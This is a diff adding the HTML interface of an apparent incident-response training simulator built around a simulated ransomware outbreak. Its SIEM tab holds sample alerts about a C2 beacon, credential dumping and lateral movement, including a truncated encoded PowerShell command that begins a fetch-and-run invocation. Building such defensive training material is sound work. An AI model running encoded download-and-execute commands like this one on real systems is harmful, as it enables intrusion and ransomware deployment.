@@ -1,0 +1,1220 @@
+
+<!DOCTYPE html>
+<html class="dark" lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Simulator</title>
+  <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
+  <script>
+    tailwind.config = {
+      darkMode: "class",
+      theme: {
+        extend: {
+          colors: {
+            "pri": "#adc7ff",
+            "pri-c": "#4a8eff",
+            "bg": "#08080a",
+            "srf": "#0e0e12",
+            "srf-1": "#14141a",
+            "srf-2": "#1a1a22",
+            "srf-3": "#22222c",
+            "txt": "#d8dae5",
+            "txt-2": "#8a8da0",
+            "brd": "#25252f",
+            "err": "#ff5c5c",
+            "ok": "#4ade80",
+            "warn": "#fbbf24",
+            "purple": "#a78bfa",
+          },
+          fontFamily: {
+            "h": ["Inter", "sans-serif"],
+            "b": ["Inter", "sans-serif"],
+            "m": ["Fira Code", "monospace"]
+          },
+        },
+      },
+    }
+  </script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: #000000; overflow: hidden; height: 100vh; }
+
+    .material-symbols-outlined {
+      font-variation-settings: 'FILL' 0, 'wght' 300, 'GRAD' 0, 'opsz' 24;
+    }
+
+    ::-webkit-scrollbar { width: 4px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: #25252f; border-radius: 4px; }
+    ::-webkit-scrollbar-thumb:hover { background: #35354f; }
+
+    /* ═══ Terminal ═══ */
+    #term {
+      background: #000000;
+      font-family: 'Fira Code', monospace;
+      font-size: 14px;
+      line-height: 1.6;
+      color: #e0e2eb;
+      border: 1px solid #1e1e28;
+    }
+    #term-scroll { overflow-y: auto; }
+    .prompt-user { color: #4ade80; }
+    .prompt-at { color: #8a8da0; }
+    .prompt-host { color: #adc7ff; }
+    .prompt-path { color: #a78bfa; }
+    .prompt-dollar { color: #8a8da0; }
+    .out-err { color: #ff5c5c; }
+    .out-ok { color: #4ade80; }
+    .out-info { color: #adc7ff; }
+    .out-warn { color: #fbbf24; }
+    .out-dim { color: #555870; }
+
+    #cmd-input {
+      background: none; border: none; outline: none;
+      color: #d8dae5; font: inherit; width: 100%;
+      caret-color: #4ade80;
+    }
+
+    .cursor-blink {
+      display: inline-block; width: 7px; height: 15px;
+      background: #4ade80; vertical-align: text-bottom;
+      animation: blink 1.1s step-end infinite;
+    }
+    @keyframes blink { 0%,50%{opacity:1} 51%,100%{opacity:0} }
+
+    /* ═══ Panels ═══ */
+    .panel {
+      background: #0e0e12;
+      border: 1px solid #1e1e28;
+      border-radius: 12px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+    .panel-head {
+      display: flex; align-items: center; gap: 8px;
+      padding: 12px 16px;
+      border-bottom: 1px solid #1e1e28;
+      background: #0c0c10;
+      font-size: 12px;
+      font-weight: 500;
+      color: #c8ccd8;
+      flex-shrink: 0;
+    }
+    .panel-body { flex: 1; overflow-y: auto; padding: 12px 14px; }
+
+    /* ═══ Tabs ═══ */
+    .tab-btn {
+      padding: 8px 16px; border-radius: 6px;
+      font-size: 13px; font-weight: 500;
+      color: #8a8da0; cursor: pointer;
+      border: 1px solid transparent;
+      background: transparent;
+      transition: all 0.2s ease;
+    }
+    .tab-btn:hover { color: #adc7ff; background: rgba(173,199,255,0.05); }
+    .tab-btn.active {
+      color: #adc7ff; background: rgba(173,199,255,0.08);
+      border-color: rgba(173,199,255,0.2);
+    }
+    .tab-content { display: none; }
+    .tab-content.active { display: block; }
+
+    /* ═══ Misc ═══ */
+    .glow-line {
+      height: 1px;
+      background: linear-gradient(90deg, transparent 0%, #4a8eff 50%, transparent 100%);
+      opacity: 0.3;
+    }
+    .dot { width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0; }
+    .dot-pulse { animation: dotPulse 2s ease-in-out infinite; }
+    @keyframes dotPulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+    .evidence-tag {
+      display: inline-flex; align-items: center; gap: 4px;
+      padding: 4px 10px; border-radius: 4px;
+      font-size: 11px; font-weight: 500;
+      border: 1px solid; cursor: default;
+      transition: all 0.2s ease;
+    }
+    .evidence-tag:hover { filter: brightness(1.3); }
+
+    .timeline-dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      border: 2px solid; flex-shrink: 0;
+    }
+    .timeline-line {
+      width: 2px; background: #1e1e28;
+      flex-shrink: 0; min-height: 20px;
+    }
+
+    /* ═══ Score Ring ═══ */
+    .score-ring {
+      transform: rotate(-90deg);
+    }
+    .score-ring circle {
+      fill: none;
+      stroke-width: 4;
+      stroke-linecap: round;
+    }
+    .score-ring .ring-bg { stroke: #1e1e28; }
+    .score-ring .ring-fill {
+      stroke: url(#scoreGrad);
+      stroke-dasharray: 251;
+      transition: stroke-dashoffset 1s ease;
+    }
+
+    /* ═══ Resize Handle ═══ */
+    .resize-h {
+      width: 6px; cursor: col-resize;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .resize-h::after {
+      content: ''; width: 2px; height: 32px;
+      border-radius: 2px; background: #25252f;
+      transition: background 0.2s;
+    }
+    .resize-h:hover::after { background: #4a8eff; }
+    /* ═══ Drawers ═══ */
+    .drawer {
+      position: absolute; top: 0; bottom: 0;
+      background: #08080a;
+      border-left: 1px solid #1e1e28;
+      border-right: 1px solid #1e1e28;
+      z-index: 40; transition: transform 0.3s ease;
+      width: 320px;
+    }
+    .drawer.left { left: 0; transform: translateX(-100%); }
+    .drawer.left.open { transform: translateX(0); }
+    .drawer.right { right: 0; transform: translateX(100%); }
+    .drawer.right.open { transform: translateX(0); }
+    
+    /* ═══ AI Chat ═══ */
+    #ai-chat {
+      position: fixed; bottom: 90px; right: 20px; width: 360px; height: 500px;
+      background: #0e0e12;
+      border: 1px solid #25252f; border-radius: 12px;
+      display: flex; flex-direction: column; z-index: 50; overflow: hidden;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+      transform: translateY(120%) scale(0.95); opacity: 0; pointer-events: none;
+      transition: all 0.3s cubic-bezier(0.2, 0.8, 0.2, 1);
+    }
+    #ai-chat.active { transform: translateY(0) scale(1); opacity: 1; pointer-events: auto; }
+    
+    #ai-fab {
+      position: fixed; bottom: 20px; right: 20px; width: 56px; height: 56px;
+      background: #14141a; border: 1px solid #25252f; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center; cursor: pointer;
+      z-index: 49; box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+      transition: all 0.2s ease;
+    }
+    #ai-fab:hover { transform: scale(1.05); border-color: #4a8eff; }
+    
+    .chat-msg { border-radius: 12px; padding: 12px 14px; margin-bottom: 12px; font-size: 13px; color: #d8dae5; line-height: 1.5; font-family: 'Inter', sans-serif;}
+    .chat-msg.bot { background: rgba(26,26,34, 0.8); border-left: 2px solid #a78bfa; border-bottom-left-radius: 0; }
+    .chat-msg.user { background: rgba(167, 139, 250, 0.1); border-right: 2px solid #a78bfa; border-bottom-right-radius: 0; margin-left: 20px; align-self: flex-end;}
+  </style>
+</head>
+
+<body class="font-b text-txt">
+
+<!-- ═══════════════ TOP BAR ═══════════════ -->
+<header class="h-11 flex items-center justify-between px-3 bg-srf border-b border-brd relative z-50 select-none">
+  <!-- Left -->
+  <div class="flex items-center gap-3">
+    <a href="/labs/" class="flex items-center gap-1.5 text-txt-2 hover:text-pri transition-colors" title="Exit to Labs">
+      <span class="material-symbols-outlined text-base">arrow_back</span>
+      <span class="text-[11px] font-m uppercase tracking-wider">Exit</span>
+    </a>
+    <div class="w-px h-5 bg-brd"></div>
+    <button class="flex items-center gap-2 hover:bg-srf-2 px-2 py-1 rounded transition-colors group" id="btn-toggle-left">
+      <span class="material-symbols-outlined text-pri text-lg group-hover:text-white" style="font-variation-settings:'FILL' 1;">assignment</span>
+      <span class="text-[11px] font-m text-pri group-hover:text-white uppercase tracking-wider transition-colors">Mission Info</span>
+    </button>
+    <div class="w-px h-5 bg-brd"></div>
+    <span class="text-[13px] font-h font-bold text-white ml-1" id="sim-title">Simulator</span>
+    <span class="text-[10px] font-m text-txt-2 bg-srf-2 px-2 py-0.5 rounded-md border border-brd" id="sim-badge">IR</span>
+  </div>
+
+  <!-- Center: Timer -->
+  <div class="absolute left-1/2 -translate-x-1/2 flex items-center gap-3">
+    <div class="flex items-center gap-2 bg-bg px-4 py-1 rounded-lg border border-brd">
+      <span class="material-symbols-outlined text-warn text-base">timer</span>
+      <span class="font-m text-base font-bold text-white tabular-nums tracking-wider" id="timer">00:00:00</span>
+    </div>
+  </div>
+
+  <!-- Right -->
+  <div class="flex items-center gap-2">
+    <div class="hidden md:flex items-center gap-1.5 px-3 py-1 rounded-lg bg-ok/5 border border-ok/20">
+      <div class="dot bg-ok" style="width:5px;height:5px;"></div>
+      <span class="text-[10px] font-m text-ok uppercase">Connected</span>
+    </div>
+    <button class="w-8 h-8 flex items-center justify-center rounded-lg hover:bg-srf-2 transition-colors" title="Hints" id="hints-btn">
+      <span class="material-symbols-outlined text-txt-2 text-lg">lightbulb</span>
+    </button>
+    <button class="w-8 h-8 flex items-center justify-center rounded-lg hover:bg-srf-2 transition-colors" title="Settings">
+      <span class="material-symbols-outlined text-txt-2 text-lg">tune</span>
+    </button>
+    <button class="w-8 h-8 flex items-center justify-center rounded-lg hover:bg-srf-2 transition-colors" title="Fullscreen" id="fs-btn">
+      <span class="material-symbols-outlined text-txt-2 text-lg">fullscreen</span>
+    </button>
+    <div class="w-px h-5 bg-brd"></div>
+    <button class="flex items-center gap-2 hover:bg-srf-2 px-2 py-1 rounded transition-colors group" id="btn-toggle-right">
+      <span class="material-symbols-outlined text-pri text-lg group-hover:text-white">analytics</span>
+      <span class="text-[11px] font-m text-pri group-hover:text-white uppercase tracking-wider transition-colors">Score & Metrics</span>
+    </button>
+    <div class="w-px h-5 bg-brd"></div>
+    <a href="/labs/score_summary.html" class="flex items-center gap-1.5 w-auto h-8 px-3 rounded-lg hover:bg-err/10 transition-colors group" title="End Session">
+      <span class="material-symbols-outlined text-txt-2 group-hover:text-err text-lg">stop_circle</span>
+      <span class="text-[11px] font-m text-txt-2 group-hover:text-err uppercase tracking-wider transition-colors">End Session</span>
+    </a>
+  </div>
+</header>
+
+<!-- Accent glow line -->
+<div class="glow-line"></div>
+
+<!-- ═══════════════ WORKSPACE ═══════════════ -->
+<div class="flex h-[calc(100vh-45px)]">
+
+  <!-- ──── LEFT SIDEBAR (DRAWER) ──── -->
+  <aside class="drawer left flex flex-col gap-2 p-3 overflow-y-auto" id="left-sidebar">
+
+    <!-- Mission Briefing -->
+    <div class="mb-4 pt-1">
+      <div class="text-[11px] text-pri uppercase tracking-widest font-semibold mb-1 flex items-center gap-1.5"><span class="material-symbols-outlined text-[14px]">assignment</span> Mission Briefing</div>
+      <h2 class="text-[15px] text-white font-bold leading-snug mb-4" id="mission-name">Loading…</h2>
+      
+      <div class="flex items-center gap-4 text-[13px] text-txt border-y border-brd/50 py-3 mb-4">
+        <div class="flex items-center gap-1.5">
+          <span class="material-symbols-outlined text-[16px] text-txt-2">timer</span>
+          <span class="font-m text-txt" id="mission-duration">—</span>
+        </div>
+        <div class="w-px h-5 bg-brd"></div>
+        <div class="flex items-center gap-1.5">
+          <span class="material-symbols-outlined text-[16px] text-warn">local_fire_department</span>
+          <div class="flex gap-1" id="difficulty-dots">
+            <div class="w-1.5 h-1.5 bg-srf-3" id="diff-1"></div>
+            <div class="w-1.5 h-1.5 bg-srf-3" id="diff-2"></div>
+            <div class="w-1.5 h-1.5 bg-srf-3" id="diff-3"></div>
+            <div class="w-1.5 h-1.5 bg-srf-3" id="diff-4"></div>
+            <div class="w-1.5 h-1.5 bg-srf-3" id="diff-5"></div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="text-[11px] text-txt-2 mb-2 font-semibold tracking-wide">MITRE ATT&CK® COVERAGE</div>
+      <div class="flex flex-wrap gap-1.5" id="mitre-tags">
+        <!-- JS fills -->
+      </div>
+    </div>
+
+    <!-- Objectives -->
+    <div class="flex-1 flex flex-col mb-4 pt-4 border-t border-brd/30">
+      <div class="flex justify-between items-center mb-3">
+        <div class="text-[11px] text-ok uppercase tracking-widest font-semibold flex items-center gap-1.5"><span class="material-symbols-outlined text-[14px]">flag</span> Objectives</div>
+        <span class="text-[11px] text-ok font-m" id="obj-count">0 / 0</span>
+      </div>
+      <div class="space-y-1.5 overflow-y-auto mb-3" id="obj-list">
+        <!-- Filled by JS -->
+      </div>
+      <div class="mt-auto">
+        <div class="flex justify-between items-center mb-1.5">
+          <span class="text-[11px] text-txt-2">Completion</span>
+          <span class="text-[11px] text-pri font-m" id="obj-pct">0%</span>
+        </div>
+        <div class="h-1 bg-srf-3 rounded-full overflow-hidden">
+          <div class="h-full bg-pri rounded-full transition-all duration-500" id="obj-bar" style="width:0%"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Evidence Locker -->
+    <div class="flex flex-col pt-4 border-t border-brd/30">
+      <div class="flex justify-between items-center mb-3">
+        <div class="text-[11px] text-warn uppercase tracking-widest font-semibold flex items-center gap-1.5"><span class="material-symbols-outlined text-[14px]">inventory_2</span> Evidence Locker</div>
+        <span class="text-[11px] text-warn font-m" id="evidence-count">0</span>
+      </div>
+      <div class="bg-srf-1 border border-brd/50 rounded-lg p-3 min-h-[80px] shadow-inner" id="evidence-list">
+        <div class="text-center py-2">
+          <span class="material-symbols-outlined text-txt-2/30 text-2xl mb-1">inbox</span>
+          <p class="text-[11px] text-txt-2">Locker empty. Use <code class="text-pri bg-srf-2 px-1 py-0.5 rounded">collect</code> cmd.</p>
+        </div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- ──── CENTER: TERMINAL + TOOLS ──── -->
+  <section class="flex-1 flex flex-col gap-2 py-2 px-10 min-w-0 mx-auto w-full max-w-7xl">
+
+    <!-- Tool Tabs -->
+    <div class="flex items-center gap-1 px-1 flex-shrink-0">
+      <button class="tab-btn active" data-tab="terminal">
+        <span class="inline-flex items-center gap-1.5">
+          <span class="material-symbols-outlined text-sm">terminal</span> Terminal
+        </span>
+      </button>
+      <button class="tab-btn" data-tab="network">
+        <span class="inline-flex items-center gap-1.5">
+          <span class="material-symbols-outlined text-sm">hub</span> Network
+        </span>
+      </button>
+      <button class="tab-btn" data-tab="files">
+        <span class="inline-flex items-center gap-1.5">
+          <span class="material-symbols-outlined text-sm">folder_open</span> Files
+        </span>
+      </button>
+      <button class="tab-btn" data-tab="logs">
+        <span class="inline-flex items-center gap-1.5">
+          <span class="material-symbols-outlined text-sm">receipt_long</span> SIEM
+        </span>
+      </button>
+    </div>
+
+    <!-- Tab: Terminal -->
+    <div class="tab-content active flex-1 flex flex-col min-h-0" id="tab-terminal">
+      <div id="term" class="panel flex-1 min-h-0">
+        <div class="panel-head justify-between">
+          <div class="flex items-center gap-2">
+            <div class="flex gap-1.5">
+              <div class="w-2.5 h-2.5 rounded-full bg-err/70"></div>
+              <div class="w-2.5 h-2.5 rounded-full bg-warn/70"></div>
+              <div class="w-2.5 h-2.5 rounded-full bg-ok/70"></div>
+            </div>
+            <span>operator@target — bash</span>
+          </div>
+          <div class="flex items-center gap-1">
+            <button class="px-2 py-0.5 rounded hover:bg-white/5 transition-colors text-txt-2 hover:text-white" id="btn-clear" title="Clear">clear</button>
+          </div>
+        </div>
+        <div class="flex-1 overflow-y-auto p-4" id="term-scroll">
+          <div id="term-output"></div>
+          <div class="flex items-center" id="prompt-line">
+            <span class="prompt-user">operator</span><span class="prompt-at">@</span><span class="prompt-host">target</span><span class="prompt-at">:</span><span class="prompt-path">~</span><span class="prompt-dollar">$</span>&nbsp;
+            <input type="text" id="cmd-input" autocomplete="off" spellcheck="false" autofocus>
+          </div>
+        </div>
+        <div class="flex items-center justify-between px-4 py-1.5 border-t border-brd/50 text-[10px] font-m text-txt-2 flex-shrink-0">
+          <span>SSH · AES-256-GCM</span>
+          <span>Latency: <span class="text-ok">12ms</span></span>
+          <span>PTY /dev/pts/0</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Tab: Network Map -->
+    <div class="tab-content flex-1 min-h-0" id="tab-network">
+      <div class="panel h-full">
+        <div class="panel-head">
+          <span class="material-symbols-outlined text-pri text-base">hub</span>
+          Network Topology — 10.0.1.0/24
+        </div>
+        <div class="panel-body flex items-center justify-center relative">
+          <svg viewBox="0 0 600 360" class="w-full max-w-2xl" style="font-family: 'JetBrains Mono', monospace;">
+            <!-- Lines -->
+            <line x1="300" y1="60" x2="140" y2="180" stroke="#25252f" stroke-width="1.5"/>
+            <line x1="300" y1="60" x2="300" y2="180" stroke="#25252f" stroke-width="1.5"/>
+            <line x1="300" y1="60" x2="460" y2="180" stroke="#25252f" stroke-width="1.5"/>
+            <line x1="140" y1="180" x2="140" y2="300" stroke="#ff5c5c" stroke-width="1.5" stroke-dasharray="4 4" opacity="0.6"/>
+            <line x1="300" y1="180" x2="300" y2="300" stroke="#25252f" stroke-width="1.5"/>
+            <line x1="460" y1="180" x2="460" y2="300" stroke="#25252f" stroke-width="1.5"/>
+            <!-- External C2 -->
+            <line x1="140" y1="300" x2="30" y2="340" stroke="#ff5c5c" stroke-width="1.5" stroke-dasharray="4 4" opacity="0.4"/>
+            <circle cx="30" cy="340" r="14" fill="#1a0808" stroke="#ff5c5c" stroke-width="1.5" opacity="0.7"/>
+            <text x="30" y="344" text-anchor="middle" fill="#ff5c5c" font-size="8">C2</text>
+
+            <!-- Router/Firewall -->
+            <rect x="270" y="36" width="60" height="48" rx="8" fill="#0e0e12" stroke="#4ade80" stroke-width="1.5"/>
+            <text x="300" y="56" text-anchor="middle" fill="#4ade80" font-size="9">FW-01</text>
+            <text x="300" y="72" text-anchor="middle" fill="#555870" font-size="7">.1</text>
+
+            <!-- WKS-07 (infected) -->
+            <rect x="100" y="156" width="80" height="48" rx="8" fill="#1a0808" stroke="#ff5c5c" stroke-width="1.5">
+              <animate attributeName="stroke-opacity" values="1;0.4;1" dur="2s" repeatCount="indefinite"/>
+            </rect>
+            <text x="140" y="176" text-anchor="middle" fill="#ff5c5c" font-size="9">WKS-07</text>
+            <text x="140" y="192" text-anchor="middle" fill="#ff5c5c" font-size="7">.7 ⚠</text>
+
+            <!-- DC-01 -->
+            <rect x="260" y="156" width="80" height="48" rx="8" fill="#0e0e12" stroke="#fbbf24" stroke-width="1.5"/>
+            <text x="300" y="176" text-anchor="middle" fill="#fbbf24" font-size="9">DC-01</text>
+            <text x="300" y="192" text-anchor="middle" fill="#555870" font-size="7">.10</text>
+
+            <!-- FS-01 -->
+            <rect x="420" y="156" width="80" height="48" rx="8" fill="#0e0e12" stroke="#4ade80" stroke-width="1.5"/>
+            <text x="460" y="176" text-anchor="middle" fill="#4ade80" font-size="9">FS-01</text>
+            <text x="460" y="192" text-anchor="middle" fill="#555870" font-size="7">.20</text>
+
+            <!-- Endpoints row 2 -->
+            <rect x="100" y="276" width="80" height="48" rx="8" fill="#0e0e12" stroke="#25252f" stroke-width="1.5"/>
+            <text x="140" y="296" text-anchor="middle" fill="#555870" font-size="9">WKS-03</text>
+            <text x="140" y="312" text-anchor="middle" fill="#555870" font-size="7">.3</text>
+
+            <rect x="260" y="276" width="80" height="48" rx="8" fill="#0e0e12" stroke="#4ade80" stroke-width="1.5"/>
+            <text x="300" y="296" text-anchor="middle" fill="#4ade80" font-size="9">SIEM</text>
+            <text x="300" y="312" text-anchor="middle" fill="#555870" font-size="7">.50</text>
+
+            <rect x="420" y="276" width="80" height="48" rx="8" fill="#0e0e12" stroke="#4ade80" stroke-width="1.5"/>
+            <text x="460" y="296" text-anchor="middle" fill="#4ade80" font-size="9">WKS-12</text>
+            <text x="460" y="312" text-anchor="middle" fill="#555870" font-size="7">.12</text>
+
+            <!-- Legend -->
+            <circle cx="30" cy="30" r="4" fill="#4ade80"/><text x="40" y="34" fill="#555870" font-size="8">Clean</text>
+            <circle cx="100" cy="30" r="4" fill="#ff5c5c"/><text x="110" y="34" fill="#555870" font-size="8">Infected</text>
+            <circle cx="180" cy="30" r="4" fill="#fbbf24"/><text x="190" y="34" fill="#555870" font-size="8">At Risk</text>
+          </svg>
+        </div>
+      </div>
+    </div>
+
+    <!-- Tab: Files -->
+    <div class="tab-content flex-1 min-h-0" id="tab-files">
+      <div class="panel h-full">
+        <div class="panel-head justify-between">
+          <div class="flex items-center gap-2">
+            <span class="material-symbols-outlined text-pri text-base">folder_open</span>
+            File Browser — /home/operator/
+          </div>
+          <span class="text-txt-2">5 items</span>
+        </div>
+        <div class="panel-body">
+          <table class="w-full text-sm">
+            <thead>
+              <tr class="text-[10px] text-txt-2 uppercase tracking-wider border-b border-brd/50">
+                <th class="text-left py-2 px-2 font-normal">Name</th>
+                <th class="text-left py-2 px-2 font-normal">Size</th>
+                <th class="text-left py-2 px-2 font-normal">Modified</th>
+                <th class="text-left py-2 px-2 font-normal">Permissions</th>
+              </tr>
+            </thead>
+            <tbody class="font-m text-xs">
+              <tr class="border-b border-brd/20 hover:bg-srf-2 transition-colors cursor-pointer">
+                <td class="py-2.5 px-2 flex items-center gap-2"><span class="material-symbols-outlined text-pri text-base">folder</span><span class="text-pri">Documents</span></td>
+                <td class="py-2.5 px-2 text-txt-2">4.0K</td>
+                <td class="py-2.5 px-2 text-txt-2">Dec 14 09:23</td>
+                <td class="py-2.5 px-2 text-txt-2">drwxr-xr-x</td>
+              </tr>
+              <tr class="border-b border-brd/20 hover:bg-srf-2 transition-colors cursor-pointer">
+                <td class="py-2.5 px-2 flex items-center gap-2"><span class="material-symbols-outlined text-pri text-base">folder</span><span class="text-pri">Downloads</span></td>
+                <td class="py-2.5 px-2 text-txt-2">4.0K</td>
+                <td class="py-2.5 px-2 text-txt-2">Dec 14 11:47</td>
+                <td class="py-2.5 px-2 text-txt-2">drwxr-xr-x</td>
+              </tr>
+              <tr class="border-b border-brd/20 hover:bg-err/5 transition-colors cursor-pointer group">
+                <td class="py-2.5 px-2 flex items-center gap-2"><span class="material-symbols-outlined text-err text-base">bug_report</span><span class="text-err">malware_sample.exe</span><span class="evidence-tag border-err/30 text-err bg-err/5 ml-2">suspicious</span></td>
+                <td class="py-2.5 px-2 text-txt-2">847K</td>
+                <td class="py-2.5 px-2 text-txt-2">Dec 14 14:02</td>
+                <td class="py-2.5 px-2 text-txt-2">-rwxr-xr-x</td>
+              </tr>
+              <tr class="border-b border-brd/20 hover:bg-warn/5 transition-colors cursor-pointer">
+                <td class="py-2.5 px-2 flex items-center gap-2"><span class="material-symbols-outlined text-warn text-base">description</span><span class="text-warn">ransom_note.txt</span></td>
+                <td class="py-2.5 px-2 text-txt-2">1.2K</td>
+                <td class="py-2.5 px-2 text-txt-2">Dec 14 14:05</td>
+                <td class="py-2.5 px-2 text-txt-2">-rw-r--r--</td>
+              </tr>
+              <tr class="hover:bg-srf-2 transition-colors cursor-pointer">
+                <td class="py-2.5 px-2 flex items-center gap-2"><span class="material-symbols-outlined text-txt-2 text-base">description</span><span class="text-txt">.bash_history</span></td>
+                <td class="py-2.5 px-2 text-txt-2">342B</td>
+                <td class="py-2.5 px-2 text-txt-2">Dec 14 13:58</td>
+                <td class="py-2.5 px-2 text-txt-2">-rw-------</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- Tab: SIEM -->
+    <div class="tab-content flex-1 min-h-0" id="tab-logs">
+      <div class="panel h-full">
+        <div class="panel-head justify-between">
+          <div class="flex items-center gap-2">
+            <span class="material-symbols-outlined text-pri text-base">receipt_long</span>
+            SIEM Alerts — Last 24h
+          </div>
+          <div class="flex items-center gap-2">
+            <span class="evidence-tag border-err/30 text-err bg-err/5">3 Critical</span>
+            <span class="evidence-tag border-warn/30 text-warn bg-warn/5">7 High</span>
+          </div>
+        </div>
+        <div class="panel-body space-y-2 font-m text-xs">
+          <div class="p-3 rounded-lg bg-err/5 border border-err/20 hover:bg-err/10 transition-colors cursor-pointer">
+            <div class="flex justify-between mb-1">
+              <span class="text-err font-bold">CRITICAL — Ransomware Execution Detected</span>
+              <span class="text-txt-2">14:02:33</span>
+            </div>
+            <p class="text-txt-2 text-[11px]">Process ransomware.exe spawned on WKS-07 with PID 1567. Parent: explorer.exe. Hash: 4a8f…c3d2</p>
+          </div>
+          <div class="p-3 rounded-lg bg-err/5 border border-err/20 hover:bg-err/10 transition-colors cursor-pointer">
+            <div class="flex justify-between mb-1">
+              <span class="text-err font-bold">CRITICAL — C2 Beacon Established</span>
+              <span class="text-txt-2">14:03:01</span>
+            </div>
+            <p class="text-txt-2 text-[11px]">Outbound connection to 185.220.101.45:443 from WKS-07. Known Darkside infrastructure.</p>
+          </div>
+          <div class="p-3 rounded-lg bg-err/5 border border-err/20 hover:bg-err/10 transition-colors cursor-pointer">
+            <div class="flex justify-between mb-1">
+              <span class="text-err font-bold">CRITICAL — Mass File Encryption</span>
+              <span class="text-txt-2">14:05:17</span>
+            </div>
+            <p class="text-txt-2 text-[11px]">Over 2,400 files modified with .encrypted extension in 3 minutes on WKS-07.</p>
+          </div>
+          <div class="p-3 rounded-lg bg-warn/5 border border-warn/20 hover:bg-warn/10 transition-colors cursor-pointer">
+            <div class="flex justify-between mb-1">
+              <span class="text-warn font-bold">HIGH — Suspicious PowerShell</span>
+              <span class="text-txt-2">14:01:55</span>
+            </div>
+            <p class="text-txt-2 text-[11px]">Encoded PowerShell command detected: -enc SQBFAFgAIAAoAE4A… on WKS-07</p>
+          </div>
+          <div class="p-3 rounded-lg bg-warn/5 border border-warn/20 hover:bg-warn/10 transition-colors cursor-pointer">
+            <div class="flex justify-between mb-1">
+              <span class="text-warn font-bold">HIGH — Credential Dumping Attempt</span>
+              <span class="text-txt-2">14:02:12</span>
+            </div>
+            <p class="text-txt-2 text-[11px]">LSASS memory access by non-standard process on WKS-07. Possible Mimikatz.</p>
+          </div>
+          <div class="p-3 rounded-lg bg-warn/5 border border-warn/20 hover:bg-warn/10 transition-colors cursor-pointer">
+            <div class="flex justify-between mb-1">
+              <span class="text-warn font-bold">HIGH — Lateral Movement Attempt</span>
+              <span class="text-txt-2">14:06:44</span>
+            </div>
+            <p class="text-txt-2 text-[11px]">SMB connection from WKS-07 (10.0.1.7) to DC-01 (10.0.1.10) using admin$ share.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Response Submit Bar -->
+    <div class="flex items-center gap-2 px-1 flex-shrink-0">
+      <div class="flex-1 flex items-center bg-srf border border-brd rounded-xl px-4 py-2 gap-3 focus-within:border-pri/40 transition-colors">
+        <span class="material-symbols-outlined text-txt-2 text-lg">send</span>
+        <input type="text" class="flex-1 bg-transparent border-none outline-none text-sm font-m text-white placeholder:text-txt-2/40" placeholder="Submit flag, IOC, or finding…" id="response-input">
+      </div>
+      <button class="h-10 px-5 bg-gradient-to-r from-pri to-pri-c text-[#00285b] font-h font-bold text-sm rounded-xl hover:shadow-[0_0_25px_rgba(74,142,255,0.25)] transition-all active:scale-[0.97] flex-shrink-0" id="submit-btn">
+        Submit
+      </button>
+    </div>
+  </section>
+
+  <!-- ──── RIGHT SIDEBAR (DRAWER) ──── -->
+  <aside class="drawer right flex flex-col gap-2 p-3 overflow-y-auto" id="right-sidebar">
+
+    <!-- Score Ring -->
+    <!-- Score Ring -->
+    <div class="mb-4 pt-1">
+      <div class="flex justify-between items-center mb-1 flex-shrink-0">
+        <div class="text-[11px] text-pri uppercase tracking-widest font-semibold flex items-center gap-1.5"><span class="material-symbols-outlined text-[14px]">psychology</span> AI Score</div>
+        <div class="flex items-center gap-1.5"><div class="w-1.5 h-1.5 bg-pri rounded-full dot-pulse"></div><span class="text-[10px] text-pri tracking-widest uppercase font-semibold">Live</span></div>
+      </div>
+      <div class="flex flex-col items-center py-4">
+        <div class="relative w-28 h-28 mb-4">
+          <svg viewBox="0 0 90 90" class="score-ring w-full h-full">
+            <defs><linearGradient id="scoreGrad" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stop-color="#adc7ff"/><stop offset="100%" stop-color="#4a8eff"/></linearGradient></defs>
+            <circle class="ring-bg" cx="45" cy="45" r="40"/>
+            <circle class="ring-fill" cx="45" cy="45" r="40" id="score-circle" stroke-dashoffset="188"/>
+          </svg>
+          <div class="absolute inset-0 flex flex-col items-center justify-center">
+            <span class="text-3xl font-bold text-white" id="score-val">250</span>
+            <span class="text-[9px] text-txt-2 uppercase tracking-widest font-semibold">/ 1000</span>
+          </div>
+        </div>
+        <div class="w-full space-y-3">
+          <div>
+            <div class="flex justify-between mb-1.5"><span class="text-[11px] text-txt-2">Response Quality</span><span class="text-[11px] font-m text-ok" id="m-response">92%</span></div>
+            <div class="h-1 bg-srf-3 rounded-full overflow-hidden"><div class="h-full w-[92%] bg-ok rounded-full"></div></div>
+          </div>
+          <div>
+            <div class="flex justify-between mb-1.5"><span class="text-[11px] text-txt-2">Methodology</span><span class="text-[11px] font-m text-pri" id="m-method">78%</span></div>
+            <div class="h-1 bg-srf-3 rounded-full overflow-hidden"><div class="h-full w-[78%] bg-pri rounded-full"></div></div>
+          </div>
+          <div>
+            <div class="flex justify-between mb-1.5"><span class="text-[11px] text-txt-2">Efficiency & Speed</span><span class="text-[11px] font-m text-warn" id="m-eff">65%</span></div>
+            <div class="h-1 bg-srf-3 rounded-full overflow-hidden"><div class="h-full w-[65%] bg-warn rounded-full"></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Timeline -->
